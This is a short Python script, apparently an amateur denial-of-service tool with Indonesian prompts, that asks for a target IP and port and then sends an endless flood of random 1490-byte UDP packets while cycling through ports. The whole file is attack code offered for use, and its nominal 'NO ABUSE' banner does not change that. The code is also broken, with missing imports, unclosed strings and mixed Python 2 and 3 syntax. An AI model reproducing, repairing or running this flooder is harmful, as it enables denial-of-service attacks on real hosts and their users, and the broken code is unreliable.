import random
import socket
import threading


print("TOLS DDOS BY FELIX XYZ")
print("NO ABUSE STAY HALAL")


os.system("clear")
os.system("Ddos Attack")

ip = str(input(" Ip Target:"))
port = int(input(" Port Target:))
choice = str(input(" Gass Ddos?(y/n):))
times = int(input(" Paket Mau Berapa? :))
threads = int(input(" Pelurunya :))

###############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
###############

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Assalamualaikum %s packet %s heheheheh port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1